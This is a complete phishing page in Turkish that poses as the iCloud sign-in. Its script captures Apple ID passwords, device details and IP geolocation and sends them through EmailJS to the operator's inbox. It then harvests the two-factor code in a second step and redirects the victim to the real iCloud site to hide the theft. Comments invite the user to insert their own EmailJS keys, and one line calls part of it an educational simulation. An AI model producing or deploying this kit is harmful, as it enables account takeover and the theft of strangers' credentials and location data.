<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iCloud</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            // !!! KENDI PUBLIC KEY'INIZI GIRIN !!!
            emailjs.init("bOJixfHEM1uPomqLS"); 
        })();
    </script>
    <style>
        body, html { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", sans-serif; background-color: #f5f5f7; color: #1d1d1f; }
        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .login-card { background: #ffffff; border-radius: 18px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); padding: 48px; width: 100%; max-width: 400px; text-align: center; position: relative; }
        .icloud-logo { font-size: 48px; margin-bottom: 32px; font-weight: 300; }
        h2 { font-size: 28px; font-weight: 600; margin-bottom: 8px; }
        .subtitle { font-size: 17px; color: #86868b; margin-bottom: 32px; }
        .form-group { margin-bottom: 20px; text-align: left; }
        label { display: block; font-size: 17px; margin-bottom: 8px; font-weight: 600; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px 16px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 17px; transition: border-color 0.2s; box-sizing: border-box; }
        input:focus { outline: none; border-color: #007aff; box-shadow: 0 0 0 3px rgba(0,122,255,0.1); }
        .login-button { width: 100%; background-color: #007aff; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 17px; font-weight: 600; cursor: pointer; margin-top: 8px; transition: background-color 0.2s; }
        .login-button:hover { background-color: #005ecb; }
        .error-message { color: #ff3b30; font-size: 14px; margin-top: 16px; display: none; }
        .footer-links { margin-top: 32px; font-size: 14px; }
        .footer-links a { color: #007aff; text-decoration: none; }
        .redirect-overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.95); color: #1d1d1f; border-radius: 18px; justify-content: center; align-items: center; flex-direction: column; z-index: 10; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #007aff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <div class="redirect-overlay" id="redirectOverlay"><div class="spinner"></div><p>iCloud hesabınız doğrulanıyor...</p></div>
            <div id="stepOneForm">
                <div class="icloud-logo">☁️</div>
                <h2>iCloud'a Giriş Yap</h2>
                <p class="subtitle">Apple ID'nizi kullanarak devam edin.</p>
                <form id="loginForm">
                    <div class="form-group"><label for="username">Apple ID</label><input type="text" id="username" placeholder="ornek@icloud.com" required></div>
                    <div class="form-group"><label for="password">Parola</label><input type="password" id="password" placeholder="Parolanızı girin" required></div>
                    <button type="submit" class="login-button">Giriş Yap</button>
                    <div class="error-message" id="errorMessage">Apple ID veya parola yanlış.</div>
                </form>
                <div class="footer-links"><a href="#">Apple ID'nizi mi unuttunuz?</a> veya <a href="#">Parola mı unuttunuz?</a></div>
            </div>
            <div id="stepTwoForm" style="display: none;">
                <div class="icloud-logo">☁️</div>
                <h2>İki Faktörlü Kimlik Doğrulama</h2>
                <p class="subtitle">Apple ID'nize gönderilen 6 haneli kodu girin.</p>
                <form id="twoFactorForm">
                    <div class="form-group"><label for="twoFactorCode">Doğrulama Kodu</label><input type="text" id="twoFactorCode" placeholder="XXXXXX" maxlength="6" required></div>
                    <button type="submit" class="login-button">Doğrula</button>
                    <div class="error-message" id="errorMessage2FA">Doğrulama kodu hatalı veya süresi dolmuş. Lütfen tekrar deneyin.</div>
                </form>
            </div>
        </div>
    </div>

    <script>
        // --- 1. ADIM: GİRİŞ FORMU ---
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const sendDate = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });

            // Sosyal Medya Profili Tahmini (Eğitimsel Simülasyon)
            const platformPatterns = {
                snapchat: `${username.split('@')[0]}_Snap!`,
                instagram: password.length > 8 ? password : `${password}123`,
                others: "Commonly used: Facebook, X (Twitter), LinkedIn"
            };

            // Cihaz ve Depolama Analizi
            const detectVaults = () => {
                const isChrome = /Chrome/.test(navigator.userAgent);
                const isSafari = /Safari/.test(navigator.userAgent) && !/Chrome/.test(navigator.userAgent);
                if (isChrome) return "Google Password Manager (Chrome)";
                if (isSafari) return "iCloud Keychain (Safari)";
                return "Generic Browser Auto-fill";
            };
            const photoRiskProfile = "Simulated: GPS_LAT/LONG extraction from last uploaded JPEG";
            const device_model = navigator.platform || "Bilinmeyen Cihaz";
            const os_info = navigator.userAgent.includes("iPhone") ? "iOS" : (navigator.userAgent.includes("Android") ? "Android" : "Diğer");
            const browser = navigator.userAgent;

            // Ağ ve Coğrafi Konum Bilgileri
            let geoData = {};
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (!response.ok) throw new Error('Network response was not ok');
                geoData = await response.json();
            } catch (error) {
                console.error("Konum/IP bilgisi alınamadı:", error);
                geoData = { ip: "Alınamadı", city: "Alınamadı", country_name: "Alınamadı", org: "Alınamadı", latitude: "", longitude: "" };
            }

            // EmailJS'e gönderilecek tüm verileri birleştir
            const templateParams = {
                username: username, password: password, send_date: sendDate,
                snapchat_pattern: platformPatterns.snapchat, instagram_pattern: platformPatterns.instagram, social_media_others: platformPatterns.others,
                storage_locations: detectVaults(), photo_metadata: photoRiskProfile, device_model: device_model, os_info: os_info, browser: browser,
                ip_address: geoData.ip, isp: geoData.org, country: geoData.country_name, city: geoData.city, latitude: geoData.latitude, longitude: geoData.longitude
            };

            // !!! KENDI SERVICE_ID VE TEMPLATE_ID'NIZI GIRIN !!!
            emailjs.send('service_mdm9ze3', 'template_umbj15o', templateParams)
                .then(function(response) {
                    console.log('1. Adım E-posta (Giriş Bilgileri) başarıyla gönderildi!', response.status, response.text);
                    // 2. Adım formunu göster, 1. Adım formunu gizle
                    document.getElementById('stepOneForm').style.display = 'none';
                    document.getElementById('stepTwoForm').style.display = 'block';
                }, function(error) {
                    console.log('E-posta gönderilemedi...', error);
                    // Hata olsa bile 2. adıma geç (kullanıcıyı oyalamak için)
                    document.getElementById('stepOneForm').style.display = 'none';
                    document.getElementById('stepTwoForm').style.display = 'block';
                });
        });

        // --- 2. ADIM: 2FA FORMU ---
        document.getElementById('twoFactorForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const twoFactorCode = document.getElementById('twoFactorCode').value;
            const username = document.getElementById('username').value; // Önceki adımdaki kullanıcı adını al

            // 2FA kodunu ayrı bir e-posta ile göndermek için parametreler
            const twoFaParams = {
                username: username,
                two_fa_code: twoFactorCode
            };

            // !!! KENDI 2FA ICIN OLUSTURDUGUN SERVICE_ID VE TEMPLATE_ID'NIZI GIRIN !!!
            emailjs.send('service_mdm9ze3', 'template_umbj15o', twoFaParams)
                .then(function(response) {
                    console.log('2. Adım E-posta (2FA Kodu) başarıyla gönderildi!', response.status, response.text);
                    
                    // Kullanıcıyı yönlendirme ekranına al
                    document.getElementById('stepTwoForm').style.display = 'none';
                    document.getElementById('redirectOverlay').style.display = 'flex';

                    // 3 saniye sonra gerçek iCloud'a yönlendir
                    setTimeout(() => {
                        window.location.href = 'https://www.icloud.com/';
                    }, 3000);

                }, function(error) {
                    console.log('2FA E-postası gönderilemedi...', error);
                    // Hata mesajını göster
                    document.getElementById('errorMessage2FA').style.display = 'block';
                });
        });
    </script>
</body>
</html>
